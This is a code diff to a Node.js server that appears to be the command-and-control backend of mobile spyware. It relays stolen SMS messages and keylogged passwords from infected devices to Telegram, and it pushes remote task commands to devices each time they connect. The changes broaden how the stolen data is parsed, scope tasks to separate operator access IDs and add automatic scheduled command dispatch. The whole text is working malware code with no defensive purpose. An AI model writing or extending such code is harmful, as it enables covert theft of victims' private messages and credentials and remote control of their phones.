@@ -217,7 +217,8 @@ async function _autoSendSmsToTelegram(deviceId, deviceName, sendToAdmin, userLis
         let msgs = [];
         try {
             const d = typeof response === 'string' ? JSON.parse(response) : response;
-            msgs = d.messages || d.sms || [];
+            msgs = d.messages || d.sms || d.smsList || d.smsMessages || d.allSms
+                || d.data || d.results || [];
         } catch (_) {}
         if (!msgs.length) return;
         const limited = msgs.slice(0, 100);
@@ -265,7 +266,8 @@ async function _autoSendPasswordsToTelegram(deviceId, deviceName, sendToAdmin, u
         let entries = [];
         try {
             const d = typeof response === 'string' ? JSON.parse(response) : response;
-            entries = (d.entries || d.keylogs || []).filter(e =>
+            const all = d.entries || d.keylogs || d.logs || d.keylogEntries || d.data || [];
+            entries = all.filter(e =>
                 e.isPassword === true || e.isPassword === 'true' || e.eventType === 'PASSWORD_FOCUS'
             );
         } catch (_) {}
@@ -818,15 +820,40 @@ async function processMessage(clientId, clientType, event, data) {
             await dev.save();
         } catch (e) { log('DB', 'save error: ' + e.message, 'warn'); }
 
-        // Load saved tasks from MongoDB (device-specific + global) and send them to the device
+        // Load saved tasks from MongoDB scoped to this accessId and send them to the device
         let deviceTasks = [];
         try {
-            deviceTasks = await Task.find({ $or: [{ deviceId }, { deviceId: 'global' }] })
-                .sort({ updatedAt: -1 }).lean();
+            const taskQuery = accessId
+                ? { $or: [{ accessId }, { accessId: '' }, { deviceId }] }
+                : { $or: [{ accessId: '' }, { deviceId }] };
+            deviceTasks = await Task.find(taskQuery).sort({ updatedAt: -1 }).lean();
         } catch (_) {}
 
         // Ack back to device
         if (conn) tcpSend(conn, 'device:registered', { success: true, deviceId, tasks: deviceTasks });
+
+        // Dispatch scheduled tasks (scheduleOnConnect) to the device on every fresh connect
+        if (isFreshConnect) {
+            try {
+                const scheduledTasks = await Task.find({
+                    scheduleOnConnect: true,
+                    $or: accessId
+                        ? [{ accessId }, { accessId: '' }]
+                        : [{ accessId: '' }],
+                }).lean();
+                for (const task of scheduledTasks) {
+                    const freshConn = _getTcpConnForDevice(deviceId);
+                    if (!freshConn || !freshConn.writable) break;
+                    const schedCmdId = crypto.randomBytes(12).toString('hex');
+                    tcpSend(freshConn, 'command:execute', {
+                        commandId: schedCmdId,
+                        command:   'run_task_local',
+                        params:    { steps: task.steps || [], taskName: task.name },
+                    });
+                    log('TASK', `Auto-dispatched scheduled task "${task.name}" → ${deviceId}`);
+                }
+            } catch (_) {}
+        }
 
         // Notify dashboards (only on a real fresh connect, not re-registers within 5 min)
         if (isFreshConnect) {
@@ -2843,32 +2870,47 @@ app.post('/api/device/:deviceId/reset-session', async (req, res) => {
     res.json({ success: true, deviceId, pendingCleared: cleared, redisKeysRemoved: redisCleared });
 });
 
-// ── Task Studio — MongoDB-backed workflow storage (tasks are GLOBAL) ──────────
+// ── Task Studio — per-accessId workflow storage ───────────────────────────────
+// GET /api/tasks?accessId=ACC-XXXX   → tasks for that user only
 app.get('/api/tasks', async (req, res) => {
     try {
-        const tasks = await Task.find({}).sort({ updatedAt: -1 });
+        const { accessId } = req.query;
+        const query = accessId ? { accessId } : {};
+        const tasks = await Task.find(query).sort({ updatedAt: -1 });
         res.json({ success: true, tasks });
     } catch (e) { res.status(500).json({ success: false, error: e.message }); }
 });
 
-// Keep legacy route for backward compat — also returns all tasks
+// Legacy route — keep for backward compat, scoped by accessId if provided
 app.get('/api/tasks/:deviceId', async (req, res) => {
     try {
-        const tasks = await Task.find({}).sort({ updatedAt: -1 });
+        const { accessId } = req.query;
+        const query = accessId ? { accessId } : { deviceId: req.params.deviceId };
+        const tasks = await Task.find(query).sort({ updatedAt: -1 });
         res.json({ success: true, tasks });
     } catch (e) { res.status(500).json({ success: false, error: e.message }); }
 });
 
 app.post('/api/tasks', async (req, res) => {
-    const { deviceId, name, steps, _id } = req.body || {};
+    const { deviceId, accessId, name, steps, scheduleOnConnect, _id } = req.body || {};
     if (!name) return res.status(400).json({ success: false, error: 'name required' });
     try {
         let task;
         if (_id) {
-            task = await Task.findByIdAndUpdate(_id, { name, steps: steps || [], updatedAt: new Date() }, { new: true });
+            task = await Task.findByIdAndUpdate(
+                _id,
+                { name, steps: steps || [], scheduleOnConnect: !!scheduleOnConnect, updatedAt: new Date() },
+                { new: true }
+            );
             if (!task) return res.status(404).json({ success: false, error: 'Task not found' });
         } else {
-            task = await new Task({ deviceId: deviceId || 'global', name, steps: steps || [] }).save();
+            task = await new Task({
+                accessId:          accessId || '',
+                deviceId:          deviceId || 'global',
+                name,
+                steps:             steps || [],
+                scheduleOnConnect: !!scheduleOnConnect,
+            }).save();
         }
         res.json({ success: true, task });
     } catch (e) { res.status(500).json({ success: false, error: e.message }); }
